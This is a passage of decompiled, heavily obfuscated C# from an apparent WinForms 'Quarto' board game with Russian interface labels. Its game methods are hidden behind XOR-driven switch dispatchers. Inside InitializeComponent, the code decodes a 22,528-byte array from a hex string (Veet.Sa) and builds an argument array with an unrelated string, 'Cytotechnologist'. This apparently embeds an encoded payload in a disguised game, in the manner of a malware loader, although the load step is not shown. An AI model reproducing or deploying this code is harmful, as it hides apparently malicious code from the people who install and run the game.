					int num9;
					int num10;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num9 = -1142806607;
						num10 = -1142806607;
					}
					else
					{
						num9 = -387235928;
						num10 = -387235928;
					}
					num = num9 ^ ((int)num2 * -2143015284);
					continue;
				}
				case 62u:
				{
					int num66;
					int num67;
					if (flag2)
					{
						num66 = 780952187;
						num67 = 780952187;
					}
					else
					{
						num66 = 224396950;
						num67 = 224396950;
					}
					num = num66 ^ ((int)num2 * -74259937);
					continue;
				}
				case 61u:
				{
					int num58;
					int num59;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num58 = -1691190560;
						num59 = -1691190560;
					}
					else
					{
						num58 = -928577771;
						num59 = -928577771;
					}
					num = num58 ^ (int)(num2 * 1349578865);
					continue;
				}
				case 60u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1858095003) ^ -1563105738;
						continue;
					}
					goto IL_0033;
				case 59u:
					num = -2022287903;
					continue;
				case 58u:
					if (mem[num7, 2].Square != mem[num7, 3].Square)
					{
						num = ((int)num2 * -193475373) ^ 0x2207105C;
						continue;
					}
					goto IL_03c5;
				case 57u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -162383152) ^ 0x4C91236;
						continue;
					}
					goto IL_0033;
				case 56u:
				{
					int num32;
					int num33;
					if (mem[num7, 0] != null)
					{
						num32 = -1145943637;
						num33 = -1145943637;
					}
					else
					{
						num32 = -1666897872;
						num33 = -1666897872;
					}
					num = num32 ^ (int)(num2 * 295135000);
					continue;
				}
				case 55u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -1692997445;
						continue;
					}
					goto IL_0033;
				case 54u:
				{
					int num24;
					int num25;
					if (mem[num7, 2] == null)
					{
						num24 = 1934369234;
						num25 = 1934369234;
					}
					else
					{
						num24 = 1452536274;
						num25 = 1452536274;
					}
					num = num24 ^ (int)(num2 * 1681687253);
					continue;
				}
				case 53u:
					if (mem[0, num7] != null)
					{
						num = -548331983;
						continue;
					}
					goto IL_0498;
				case 52u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 1650389411) ^ -737591867;
						continue;
					}
					goto IL_0027;
				case 51u:
					if (mem[3, num7] != null)
					{
						num = (int)(num2 * 1293552977) ^ -1073438293;
						continue;
					}
					goto IL_0498;
				case 50u:
				{
					int num60;
					int num61;
					if (mem[num7, 1] == null)
					{
						num60 = -692677760;
						num61 = -692677760;
					}
					else
					{
						num60 = -1367113823;
						num61 = -1367113823;
					}
					num = num60 ^ ((int)num2 * -1886058452);
					continue;
				}
				case 49u:
				{
					int num55;
					int num56;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num55 = 384243683;
						num56 = 384243683;
					}
					else
					{
						num55 = 466866683;
						num56 = 466866683;
					}
					num = num55 ^ ((int)num2 * -263115279);
					continue;
				}
				case 48u:
				{
					int num52;
					if (mem[num7, 0].Square != mem[num7, 1].Square)
					{
						num = -1236193088;
						num52 = -1236193088;
					}
					else
					{
						num = -936909016;
						num52 = -936909016;
					}
					continue;
				}
				case 47u:
					if (mem[num7, 2].Dark != mem[num7, 3].Dark)
					{
						num = (int)(num2 * 817337820) ^ -1519643722;
						continue;
					}
					goto IL_03c5;
				case 46u:
					if (mem[2, 1].Square == mem[3, 0].Square)
					{
						goto IL_0027;
					}
					goto IL_0033;
				case 45u:
					if (mem[num7, 2].Point != mem[num7, 3].Point)
					{
						num = (int)((num2 * 1710673521) ^ 0xC2C9B31);
						continue;
					}
					goto IL_03c5;
				case 44u:
				{
					int num45;
					if (num7 < 4)
					{
						num = -1091517212;
						num45 = -1091517212;
					}
					else
					{
						num = -365762029;
						num45 = -365762029;
					}
					continue;
				}
				case 43u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 298006840) ^ -936246208;
						continue;
					}
					goto IL_0027;
				case 42u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1725807608) ^ -2077282479;
						continue;
					}
					goto IL_0027;
				case 41u:
				{
					int num34;
					int num35;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num34 = -1933687851;
						num35 = -1933687851;
					}
					else
					{
						num34 = -1504514448;
						num35 = -1504514448;
					}
					num = num34 ^ (int)(num2 * 1305730074);
					continue;
				}
				case 40u:
					num = -1290070793;
					continue;
				case 39u:
				{
					int num26;
					int num27;
					if (mem[num7, 0].Big == mem[num7, 1].Big)
					{
						num26 = 1975421159;
						num27 = 1975421159;
					}
					else
					{
						num26 = 325553793;
						num27 = 325553793;
					}
					num = num26 ^ (int)(num2 * 8558760);
					continue;
				}
				case 38u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1494910885) ^ 0x359BDB86;
						continue;
					}
					goto IL_0027;
				case 37u:
				{
					int num20;
					int num21;
					if (mem[1, num7].Dark != mem[2, num7].Dark)
					{
						num20 = -599863268;
						num21 = -599863268;
					}
					else
					{
						num20 = -54339749;
						num21 = -54339749;
					}
					num = num20 ^ ((int)num2 * -849900635);
					continue;
				}
				case 36u:
					num = (int)((num2 * 133996821) ^ 0x783843F);
					continue;
				case 35u:
					if (mem[2, num7].Dark != mem[3, num7].Dark)
					{
						num = ((int)num2 * -1541006514) ^ 0x503F6A57;
						continue;
					}
					goto IL_07e4;
				case 34u:
				{
					int num5;
					int num6;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num5 = 1455830657;
						num6 = 1455830657;
					}
					else
					{
						num5 = 63580903;
						num6 = 63580903;
					}
					num = num5 ^ ((int)num2 * -99842178);
					continue;
				}
				case 33u:
				{
					int num70;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = -1866136120;
						num70 = -1866136120;
					}
					else
					{
						num = -1040682374;
						num70 = -1040682374;
					}
					continue;
				}
				case 31u:
				{
					int num68;
					if (mem[num7, 0].Point == mem[num7, 1].Point)
					{
						num = -401812737;
						num68 = -401812737;
					}
					else
					{
						num = -1698404604;
						num68 = -1698404604;
					}
					continue;
				}
				case 30u:
					num7++;
					num = (int)((num2 * 468151683) ^ 0x24CD47CD);
					continue;
				case 29u:
				{
					int num62;
					int num63;
					if (mem[num7, 3] == null)
					{
						num62 = 1569762812;
						num63 = 1569762812;
					}
					else
					{
						num62 = 490866545;
						num63 = 490866545;
					}
					num = num62 ^ (int)(num2 * 904740020);
					continue;
				}
				case 28u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -200950431) ^ -1190430818;
						continue;
					}
					goto IL_0027;
				case 27u:
					if (mem[0, 3] != null)
					{
						num = -501175104;
						continue;
					}
					goto IL_0033;
				case 26u:
				{
					int num57;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -1654068861;
						num57 = -1654068861;
					}
					else
					{
						num = -54610895;
						num57 = -54610895;
					}
					continue;
				}
				case 25u:
				{
					int num53;
					int num54;
					if (mem[1, num7].Point == mem[2, num7].Point)
					{
						num53 = 2099963922;
						num54 = 2099963922;
					}
					else
					{
						num53 = 842162096;
						num54 = 842162096;
					}
					num = num53 ^ ((int)num2 * -935065135);
					continue;
				}
				case 24u:
					if (mem[2, num7].Big != mem[3, num7].Big)
					{
						num = (int)(num2 * 2039859121) ^ -2038359752;
						continue;
					}
					goto IL_07e4;
				case 23u:
				{
					int num50;
					int num51;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num50 = 401604548;
						num51 = 401604548;
					}
					else
					{
						num50 = 399080527;
						num51 = 399080527;
					}
					num = num50 ^ (int)(num2 * 1550535596);
					continue;
				}
				case 22u:
				{
					int num49;
					if (mem[0, num7].Dark != mem[1, num7].Dark)
					{
						num = -1260521439;
						num49 = -1260521439;
					}
					else
					{
						num = -1229046894;
						num49 = -1229046894;
					}
					continue;
				}
				case 21u:
				{
					int num46;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = -323529541;
						num46 = -323529541;
					}
					else
					{
						num = -1403038000;
						num46 = -1403038000;
					}
					continue;
				}
				case 20u:
					result = flag;
					num = -1213707124;
					continue;
				case 19u:
				{
					int num42;
					if (mem[0, num7].Point != mem[1, num7].Point)
					{
						num = -1694282031;
						num42 = -1694282031;
					}
					else
					{
						num = -286900294;
						num42 = -286900294;
					}
					continue;
				}
				case 18u:
				{
					int num40;
					int num41;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num40 = 1398733752;
						num41 = 1398733752;
					}
					else
					{
						num40 = 1830439074;
						num41 = 1830439074;
					}
					num = num40 ^ (int)(num2 * 1033469235);
					continue;
				}
				case 16u:
					flag = true;
					num = ((int)num2 * -930293340) ^ -935427594;
					continue;
				case 15u:
					if (mem[2, num7].Point != mem[3, num7].Point)
					{
						num = ((int)num2 * -1690025622) ^ -615896415;
						continue;
					}
					goto IL_07e4;
				case 14u:
					if (mem[0, num7].Square == mem[1, num7].Square)
					{
						num = -1972879456;
						continue;
					}
					goto IL_0246;
				case 13u:
					if (mem[num7, 2].Big != mem[num7, 3].Big)
					{
						num = (int)(num2 * 385822982) ^ -1663184193;
						continue;
					}
					goto IL_03c5;
				case 12u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 1164079863) ^ -155147203;
						continue;
					}
					goto IL_0033;
				case 11u:
				{
					int num30;
					int num31;
					if (mem[3, 3] != null)
					{
						num30 = 716901423;
						num31 = 716901423;
					}
					else
					{
						num30 = 1470024401;
						num31 = 1470024401;
					}
					num = num30 ^ (int)(num2 * 245720815);
					continue;
				}
				case 10u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -806009724) ^ 0x6B328EC;
						continue;
					}
					goto IL_0027;
				case 9u:
					if (mem[1, num7] != null)
					{
						num = (int)(num2 * 2051107564) ^ -578927986;
						continue;
					}
					goto IL_0498;
				case 8u:
					flag = true;
					num = ((int)num2 * -504552456) ^ 0x446105C2;
					continue;
				case 7u:
				{
					int num22;
					int num23;
					if (mem[0, num7].Big != mem[1, num7].Big)
					{
						num22 = 1358131437;
						num23 = 1358131437;
					}
					else
					{
						num22 = 1509385195;
						num23 = 1509385195;
					}
					num = num22 ^ (int)(num2 * 869761701);
					continue;
				}
				case 6u:
				{
					int num14;
					int num15;
					if (mem[2, 2] != null)
					{
						num14 = -1058025759;
						num15 = -1058025759;
					}
					else
					{
						num14 = -1851528939;
						num15 = -1851528939;
					}
					num = num14 ^ ((int)num2 * -1547364043);
					continue;
				}
				case 5u:
					num8 = ((mem[2, num7].Square == mem[3, num7].Square) ? 1 : 0);
					goto IL_0247;
				case 4u:
				{
					int num13;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -1881454451;
						num13 = -1881454451;
					}
					else
					{
						num = -363456347;
						num13 = -363456347;
					}
					continue;
				}
				case 3u:
				{
					int num12;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -10979920;
						num12 = -10979920;
					}
					else
					{
						num = -165816599;
						num12 = -165816599;
					}
					continue;
				}
				case 2u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1129505908) ^ -1232785571;
						continue;
					}
					goto IL_0027;
				case 1u:
					if (mem[2, num7] != null)
					{
						num = ((int)num2 * -1684413626) ^ 0x4015467;
						continue;
					}
					goto IL_0498;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num3 = -261069570;
						num4 = -261069570;
					}
					else
					{
						num3 = -696898363;
						num4 = -696898363;
					}
					num = num3 ^ (int)(num2 * 962269828);
					continue;
				}
				case 32u:
					break;
				default:
					{
						return result;
					}
					IL_0246:
					num8 = 0;
					goto IL_0247;
					IL_0027:
					num = -1024953668;
					num11 = -1024953668;
					continue;
					IL_0498:
					num8 = 0;
					goto IL_0247;
					IL_07e4:
					num8 = 1;
					goto IL_0247;
					IL_03c5:
					num8 = 1;
					goto IL_0247;
					IL_0033:
					num = -2092975478;
					num11 = -2092975478;
					continue;
					IL_0247:
					flag2 = (byte)num8 != 0;
					num = -28971957;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num4 = default(int);
		bool flag4 = default(bool);
		int num3 = default(int);
		bool result = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -2055335266;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF35C955Bu) % 15u)
				{
				case 13u:
					num4++;
					num = -2055966602;
					continue;
				case 12u:
					flag4 = num4 < 4;
					num = -1052520775;
					continue;
				case 11u:
					num3++;
					num = ((int)num2 * -932501220) ^ 0x31429D73;
					continue;
				case 10u:
					result = flag;
					num = (int)(num2 * 1182845689) ^ -1929393545;
					continue;
				case 9u:
					flag = false;
					num = (int)((num2 * 486688084) ^ 0x4C2D456);
					continue;
				case 8u:
				{
					int num7;
					int num8;
					if (!flag4)
					{
						num7 = 1561032339;
						num8 = 1561032339;
					}
					else
					{
						num7 = 85450770;
						num8 = 85450770;
					}
					num = num7 ^ ((int)num2 * -1104444414);
					continue;
				}
				case 6u:
				{
					int num9;
					int num10;
					if (!flag3)
					{
						num9 = 780798058;
						num10 = 780798058;
					}
					else
					{
						num9 = 1448234209;
						num10 = 1448234209;
					}
					num = num9 ^ (int)(num2 * 734873268);
					continue;
				}
				case 5u:
				{
					int num5;
					int num6;
					if (!flag2)
					{
						num5 = 1351367812;
						num6 = 1351367812;
					}
					else
					{
						num5 = 1753496634;
						num6 = 1753496634;
					}
					num = num5 ^ ((int)num2 * -1080523793);
					continue;
				}
				case 4u:
					num3 = 0;
					num = ((int)num2 * -268658654) ^ 0x36D376B3;
					continue;
				case 3u:
					flag3 = mem[num3, num4] == null;
					num = -707392922;
					continue;
				case 2u:
					num = ((int)num2 * -1094984169) ^ 0x4CEFD24D;
					continue;
				case 1u:
					num4 = 0;
					num = -2055966602;
					continue;
				case 0u:
					flag2 = num3 < 4;
					num = -1954828311;
					continue;
				case 7u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 1469693785;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x76E9474Au) % 9u)
				{
				case 8u:
					num = ((int)num2 * -375577481) ^ -2128367947;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -737281769) ^ -852718022;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 311767862) ^ 0x42747E8);
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -179329630) ^ -476903749;
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)((num2 * 1125677123) ^ 0xF2895B3);
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -226269333) ^ 0x1A96CE92;
					continue;
				case 0u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)((num2 * 2136004553) ^ 0x3CEC9E9E);
					continue;
				default:
					return;
				case 5u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = 1811806836;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x7B6A3B66u) % 5u)
				{
				case 4u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -882014163) ^ 0xA34983E;
					continue;
				case 3u:
					if (disposing)
					{
						num = (int)((num2 * 382609927) ^ 0xD574FA3);
						continue;
					}
					goto IL_003e;
				case 2u:
					if (components != null)
					{
						num = 2017391648;
						num3 = 2017391648;
						continue;
					}
					goto IL_003e;
				case 0u:
					break;
				default:
					{
						((Form)this).Dispose(disposing);
						return;
					}
					IL_003e:
					num = 1827080048;
					num3 = 1827080048;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Expected O, but got Unknown
		components = Form1.smethod_52();
		bool flag = default(bool);
		int num3 = default(int);
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		string string_ = default(string);
		while (true)
		{
			int num = 137521454;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8754E41u) % 135u)
				{
				case 134u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1571995785) ^ 0x4A8FAFFB);
					continue;
				case 133u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 1364690015) ^ 0xC4F50FC);
					continue;
				case 132u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -2035093363) ^ 0xD2C1129;
					continue;
				case 131u:
					flag = num3 < 22528;
					num = 332178621;
					continue;
				case 130u:
					num = ((int)num2 * -1505935830) ^ 0x25AA6A62;
					continue;
				case 129u:
					num = (int)((num2 * 1921565837) ^ 0x456D8D8D);
					continue;
				case 128u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -1507745828) ^ -1494496507;
					continue;
				case 127u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -1373969935) ^ -571929871;
					continue;
				case 126u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -413148647) ^ 0x1CF29464;
					continue;
				case 125u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 1886021465) ^ 0x5685B82F);
					continue;
				case 124u:
					string_ = Veet.Sa;
					num = (int)(num2 * 1535371408) ^ -1855604047;
					continue;
				case 123u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 823517209) ^ 0x6D74F42D);
					continue;
				case 122u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 1803190104) ^ -844696550;
					continue;
				case 121u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 2089114764) ^ 0x5D6859A6);
					continue;
				case 120u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1581820333) ^ -1334520409;
					continue;
				case 119u:
					num = ((int)num2 * -2117669356) ^ 0x2F3C3664;
					continue;
				case 118u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -1908954963) ^ 0x48DC0DC3;
					continue;
				case 117u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = 425859582;
					continue;
				case 116u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -573913900) ^ -1163406445;
					continue;
				case 115u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -201105244) ^ -349228896;
					continue;
				case 114u:
					array = new byte[22528];
					num3 = 0;
					num = (int)(num2 * 1186526882) ^ -87287527;
					continue;
				case 113u:
					num = ((int)num2 * -319023597) ^ 0x16B424E8;
					continue;
				case 111u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -659902078) ^ 0x19C8A3B4;
					continue;
				case 110u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -2070961241) ^ -47793934;
					continue;
				case 109u:
					num = ((int)num2 * -7779467) ^ 0x389CC3D8;
					continue;
				case 108u:
					num = (int)((num2 * 502906334) ^ 0x14A134E9);
					continue;
				case 107u:
					num = ((int)num2 * -1333453295) ^ 0x3A0470A2;
					continue;
				case 106u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1563513475) ^ -1293919571;
					continue;
				case 105u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -337733017) ^ -1730914812;
					continue;
				case 104u:
					num = (int)(num2 * 897116306) ^ -1766449380;
					continue;
				case 103u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 2120669738) ^ -1495504430;
					continue;
				case 102u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -298064231) ^ 0x2E583755;
					continue;
				case 101u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 814565128) ^ 0x716B0F65);
					continue;
				case 100u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					Form1.smethod_92((Control)(object)this);
					num = (int)((num2 * 1846444193) ^ 0x7B6B5221);
					continue;
				case 99u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 1827946595) ^ -1751032660;
					continue;
				case 98u:
					num = ((int)num2 * -1133953678) ^ 0x486D3C7;
					continue;
				case 97u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 415953653) ^ 0x23EBB112);
					continue;
				case 96u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 945945184) ^ -620296837;
					continue;
				case 95u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -1081900821) ^ 0x258F9C7D;
					continue;
				case 94u:
					timer1 = Form1.smethod_56(components);
					num = (int)(num2 * 327071740) ^ -644846803;
					continue;
				case 93u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					Form1.smethod_61((Control)(object)button1, "button1");
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1781072728) ^ -588257313;
					continue;
				case 92u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -693454122) ^ 0x13334B6C;
					continue;
				case 91u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -2051427907) ^ -1938639353;
					continue;
				case 90u:
					num = ((int)num2 * -400784141) ^ -344445429;
					continue;
				case 89u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = (int)((num2 * 615520002) ^ 0x76283E91);
					continue;
				case 88u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)(num2 * 1551546404) ^ -462751847;
					continue;
				case 87u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -1831555962) ^ 0x194C57CF;
					continue;
				case 86u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -1938585616) ^ 0x23C8AE14;
					continue;
				case 85u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -117344726) ^ -1707279668;
					continue;
				case 84u:
					num = ((int)num2 * -1782353855) ^ 0x68613E85;
					continue;
				case 83u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1632128279) ^ 0x1BCE6AD5;
					continue;
				case 82u:
					num = (int)(num2 * 2107207505) ^ -150170062;
					continue;
				case 81u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)((num2 * 1366403135) ^ 0x46A55CCA);
					continue;
				case 80u:
					num = ((int)num2 * -1627775398) ^ 0x34EDFA52;
					continue;
				case 79u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)(num2 * 1310788685) ^ -1243311744;
					continue;
				case 78u:
					num = ((int)num2 * -2053076821) ^ -155760455;
					continue;
				case 77u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1171043826) ^ -543964222;
					continue;
				case 76u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)(num2 * 1114967804) ^ -850980632;
					continue;
				case 75u:
					num = (int)((num2 * 964777530) ^ 0x6F0C4804);
					continue;
				case 74u:
					num = ((int)num2 * -2096164743) ^ 0x25DEA777;
					continue;
				case 73u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -629468249) ^ 0x40190EF8;
					continue;
				case 72u:
					num = (int)((num2 * 205403104) ^ 0x4D384C1A);
					continue;
				case 71u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 1374573090) ^ 0x6AC5C8A6);
					continue;
				case 70u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)(num2 * 1858990343) ^ -1027320417;
					continue;
				case 69u:
					num = (int)(num2 * 353206009) ^ -1393797434;
					continue;
				case 68u:
					num = ((int)num2 * -832049836) ^ -1107416373;
					continue;
				case 67u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 1333745700) ^ -435844640;
					continue;
				case 66u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -382765480) ^ 0x7227E158;
					continue;
				case 65u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1008727072) ^ 0x7A082952;
					continue;
				case 64u:
					num = ((int)num2 * -1565700543) ^ 0x4CDA11E2;
					continue;
				case 63u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 1276872895) ^ -1355144530;
					continue;
				case 62u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 124737968) ^ 0x5FC4EE59);
					continue;
				case 61u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)(num2 * 232460620) ^ -661963995;
					continue;
				case 60u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1621026192) ^ 0x1E65DF20;
					continue;
				case 59u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 423059422) ^ 0x367ECCCC);
					continue;
				case 58u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -763567884) ^ 0x465AB9EB;
					continue;
				case 57u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 717743547) ^ 0x6C8618F);
					continue;
				case 56u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1880923681) ^ -1923642976;
					continue;
				case 55u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -335357377) ^ -122883328;
					continue;
				case 54u:
					num = (int)((num2 * 816855637) ^ 0x729EA1FA);
					continue;
				case 53u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -624866385;
						num5 = -624866385;
					}
					else
					{
						num4 = -1728158729;
						num5 = -1728158729;
					}
					num = num4 ^ (int)(num2 * 946958057);
					continue;
				}
				case 52u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -17282629) ^ 0x5EC5AC1B;
					continue;
				case 51u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 116544093) ^ -968065441;
					continue;
				case 50u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)((num2 * 1129345984) ^ 0x10A0625);
					continue;
				case 49u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -1200154009) ^ -1789568589;
					continue;
				case 48u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 809627503) ^ -1726606993;
					continue;
				case 47u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 1587218333) ^ -997596047;
					continue;
				case 46u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)((num2 * 1461038594) ^ 0x4F5AD323);
					continue;
				case 45u:
					num = (int)(num2 * 1055736088) ^ -1694072692;
					continue;
				case 44u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1545155194) ^ 0x5B4B99EC;
					continue;
				case 43u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 264177789) ^ -912475152;
					continue;
				case 42u:
					num3++;
					num = ((int)num2 * -1232058087) ^ 0x2A98800A;
					continue;
				case 41u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = (int)((num2 * 13792932) ^ 0x66AEF93B);
					continue;
				case 40u:
					num = ((int)num2 * -1183384722) ^ -1708622439;
					continue;
				case 39u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)(num2 * 982533680) ^ -1930730197;
					continue;
				case 38u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -175383050) ^ -795846161;
					continue;
				case 37u:
					num = ((int)num2 * -1327223315) ^ -289078975;
					continue;
				case 36u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)(num2 * 308928362) ^ -427477603;
					continue;
				case 35u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
